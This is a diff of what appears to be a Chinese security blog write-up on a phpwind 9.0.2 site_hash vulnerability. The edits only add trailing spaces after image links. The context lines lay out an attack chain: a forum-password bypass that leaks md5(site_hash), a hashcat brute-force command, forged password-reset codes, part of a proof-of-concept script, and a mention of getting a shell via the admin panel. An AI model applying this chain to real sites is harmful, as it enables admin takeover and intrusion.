@@ -49,13 +49,13 @@ site_hash为全局加密的密钥，8位随机大小写字母或数字
 cookie_pre为cookie的前缀，3位随机大小写字母或数字  
 
 生成的site_hash和cookie_pre会写入data\cache\config.php    
-![1.png](https://lockcy-github-io.vercel.app/2022/05/05/phpwind9-0-2-site-hash%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/1.png)
+![1.png](https://lockcy-github-io.vercel.app/2022/05/05/phpwind9-0-2-site-hash%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/1.png)  
 **③ 破解site_hash方式**  
 orange提出了两种攻击方式：  
 1.生成所有可能的site_hash，再使用decrypt函数暴力解码。  
 2.暴力选出所有当前随机序列的种子(seed)，利用该随机种子重现site_hash。  
 但这两种方式开销太大。  
-![2.png](https://lockcy-github-io.vercel.app/2022/05/05/phpwind9-0-2-site-hash%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/2.png)
+![2.png](https://lockcy-github-io.vercel.app/2022/05/05/phpwind9-0-2-site-hash%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/2.png)  
 **④漏洞发现**  
 \src\application\bbs\controller\ForumController.php  
 ```
@@ -77,7 +77,7 @@ public function verifyAction() {
    $this->showMessage('success');
 }
 ```
-![3.png](https://lockcy-github-io.vercel.app/2022/05/05/phpwind9-0-2-site-hash%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/3.png)
+![3.png](https://lockcy-github-io.vercel.app/2022/05/05/phpwind9-0-2-site-hash%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/3.png)  
 src/library/Pw.php  
 ```
 public static function getPwdCode($pwd) {
@@ -85,7 +85,7 @@ public static function getPwdCode($pwd) {
 }
 ```
 请求一个需要密码才能访问的版块，post一个不需要密码但存在的版块id，以数组形式post password参数，绕过BBS:forum.password.error，进而将cookie设置为md5(site_hash)，如下图  
-![4.png](https://lockcy-github-io.vercel.app/2022/05/05/phpwind9-0-2-site-hash%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/4.png)
+![4.png](https://lockcy-github-io.vercel.app/2022/05/05/phpwind9-0-2-site-hash%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/4.png)  
 **⑤爆破site_hash（gpu不差的情况下一到两小时就能出），获得了site_hash**  
 ```
 hashcat.exe -m 0 -a 3 f0bf790070caa2ff337d58cf324fb2c5 -1 ?l?u?d ?1?1?1?1?1?1?1?1
@@ -130,7 +130,7 @@ public function sendResetEmail($state) {
 ```
 生成code，code为substr(md5(Pw::getTime()), mt_rand(1, 8), 8)，请求时服务器会返回时间戳，即使不知道mt_rand(1,8),8)的值，问题也不大，尝试8次即可。  
 到此为止已经可以伪造statu和code，这两个参数是重置密码链接中必须的，到此为止我们已经基本成功了，重置链接结构如下：
-![5.png](https://lockcy-github-io.vercel.app/2022/05/05/phpwind9-0-2-site-hash%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/5.png)
+![5.png](https://lockcy-github-io.vercel.app/2022/05/05/phpwind9-0-2-site-hash%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/5.png)  
 自己写了个poc，只需要修改main中username为重置密码的用户名，email为重置密码的邮箱，site_hash为目标站点的site_hash即可。  
 ```
 #!/usr/bin/env python
@@ -226,9 +226,9 @@ if __name__ == '__main__':
             if '新密码' in html.text:
                 print(url)
 ```
-![6.png](https://lockcy-github-io.vercel.app/2022/05/05/phpwind9-0-2-site-hash%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/6.png)
+![6.png](https://lockcy-github-io.vercel.app/2022/05/05/phpwind9-0-2-site-hash%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/6.png)  
 访问连接即可重置管理员密码  
-![7.png](https://lockcy-github-io.vercel.app/2022/05/05/phpwind9-0-2-site-hash%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/7.png)
+![7.png](https://lockcy-github-io.vercel.app/2022/05/05/phpwind9-0-2-site-hash%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/7.png)  
 重置密码进入后台后可以通过插入代码的方式getshell。  
 
 **⑦后记**
